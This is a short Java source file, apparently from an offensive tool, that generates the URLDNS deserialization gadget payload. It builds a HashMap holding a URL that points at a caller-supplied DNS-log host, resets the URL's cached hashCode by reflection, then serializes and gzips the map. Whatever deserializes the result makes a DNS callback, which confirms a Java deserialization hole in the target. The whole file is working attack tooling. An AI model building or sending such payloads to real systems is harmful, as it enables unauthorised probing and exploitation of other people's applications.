package com.example.frchannel.payload;

import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static byte[] getPayload(String dnslog) {
        try {
            HashMap map = new HashMap();
            URL url = new URL("http://"+dnslog);
            utils.setFieldValue(url,"hashCode",123123);
            map.put(url,123);
            utils.setFieldValue(url,"hashCode",-1);

            byte[] ser = utils.serialize(map);
            byte[] payload = utils.GzipCompress(ser);

            return payload;
        }
        catch (Exception e){

        }
        return null;
    }

}
